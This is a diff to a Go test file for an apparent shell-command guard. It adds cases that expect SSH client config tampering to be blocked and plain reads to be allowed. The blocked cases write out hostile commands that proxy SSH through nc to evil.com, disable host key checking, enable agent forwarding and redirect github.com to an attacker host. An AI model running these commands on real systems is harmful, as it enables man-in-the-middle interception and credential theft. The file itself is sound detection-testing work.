@@ -804,6 +804,82 @@ var AntiForensicsCases = []TestCase{
 	},
 }
 
+// ---------------------------------------------------------------------------
+// Category 6.5: SSH Client Config Tampering (Lateral Movement)
+// Taxonomy: persistence-evasion/lateral-movement/ssh-config-tampering
+// Rule: ts-block-ssh-config-write
+// ---------------------------------------------------------------------------
+
+// SSHConfigTamperingCases tests detection of SSH client config modifications.
+var SSHConfigTamperingCases = []TestCase{
+
+	// --- TRUE POSITIVES: writes to ~/.ssh/config ---
+
+	{
+		ID:               "TP-SSHCFG-001",
+		Command:          `echo 'Host * ProxyCommand nc evil.com 2222' >> ~/.ssh/config`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-config-tampering",
+		Analyzer:         "regex",
+		Description:      `Appending a ProxyCommand to ~/.ssh/config routes all SSH connections through an attacker MITM host. Blocked by ts-block-ssh-config-write.`,
+		Tags:             []string{"tp", "critical", "mitm", "lateral-movement"},
+	},
+	{
+		ID:               "TP-SSHCFG-002",
+		Command:          "printf 'Host *\\n  StrictHostKeyChecking no\\n  UserKnownHostsFile /dev/null\\n' > ~/.ssh/config",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-config-tampering",
+		Analyzer:         "regex",
+		Description:      `Overwriting SSH config to disable host key checking globally. Enables MITM on all subsequent SSH sessions. Blocked by ts-block-ssh-config-write.`,
+		Tags:             []string{"tp", "critical", "mitm", "host-key-bypass"},
+	},
+	{
+		ID:               "TP-SSHCFG-003",
+		Command:          "printf 'Host *.internal\\n  ForwardAgent yes\\n' >> ~/.ssh/config",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-config-tampering",
+		Analyzer:         "regex",
+		Description:      `Adding ForwardAgent to SSH config allows a compromised host to use the agent's credentials for lateral movement. Blocked by ts-block-ssh-config-write.`,
+		Tags:             []string{"tp", "critical", "credential-forwarding", "lateral-movement"},
+	},
+	{
+		ID:               "TP-SSHCFG-004",
+		Command:          `tee -a ~/.ssh/config <<< 'Host github.com HostName evil.com'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-config-tampering",
+		Analyzer:         "regex",
+		Description:      `Using tee to append SSH config that redirects github.com to an attacker-controlled host. Blocked by ts-block-ssh-config-write.`,
+		Tags:             []string{"tp", "critical", "host-redirect", "supply-chain"},
+	},
+
+	// --- TRUE NEGATIVES: safe SSH config reads ---
+
+	{
+		ID:               "TN-SSHCFG-001",
+		Command:          `cat ~/.ssh/config`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-config-tampering",
+		Analyzer:         "regex",
+		Description:      `Reading SSH config for inspection. The write-specific rule (requires redirect > or tee) does not fire on read-only cat; ts-allow-readonly returns ALLOW.`,
+		Tags:             []string{"tn", "read-only"},
+	},
+	{
+		ID:               "TN-SSHCFG-002",
+		Command:          `ssh -T git@github.com`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-config-tampering",
+		Analyzer:         "regex",
+		Description:      `Normal SSH connectivity test. Does not reference ~/.ssh/config; no config tampering rule fires.`,
+		Tags:             []string{"tn", "common-dev-operation"},
+	},
+}
+
 // AllPersistenceEvasionCases returns all test cases for Kingdom 6.
 func AllPersistenceEvasionCases() []TestCase {
 	var all []TestCase
@@ -811,6 +887,7 @@ func AllPersistenceEvasionCases() []TestCase {
 	all = append(all, AtJobSchedulingCases...)
 	all = append(all, CICDTamperingCases...)
 	all = append(all, SSHKeyGenCases...)
+	all = append(all, SSHConfigTamperingCases...)
 	all = append(all, GuardianObfuscationTNCases...)
 	all = append(all, SecurityDaemonDeactivationCases...)
 	all = append(all, AntiForensicsCases...)
